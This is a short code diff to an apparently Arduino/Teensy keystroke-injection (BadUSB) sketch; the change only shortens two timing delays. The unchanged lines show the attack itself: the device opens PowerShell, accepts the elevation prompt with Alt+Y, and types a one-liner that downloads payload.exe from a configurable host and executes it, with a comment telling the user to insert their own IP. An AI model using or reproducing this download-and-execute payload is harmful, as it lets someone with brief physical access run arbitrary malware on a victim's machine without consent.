@@ -50,14 +50,14 @@ void setup() {
   Keyboard.set_key1(0);
   Keyboard.send_now();
   // Adjust delay depending on target machine, as initial powershell startup takes time
-  delay(8000);
+  delay(3000);
   Keyboard.set_modifier(MODIFIERKEY_ALT);
   Keyboard.set_key1(KEY_Y);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
   Keyboard.set_key1(0);
   Keyboard.send_now();
-  delay(3000);
+  delay(2000);
   // Modify 127.0.0.1 with your IP address and payload.exe with your payload name
   Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'http://127.0.0.1/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
   Keyboard.send_now();
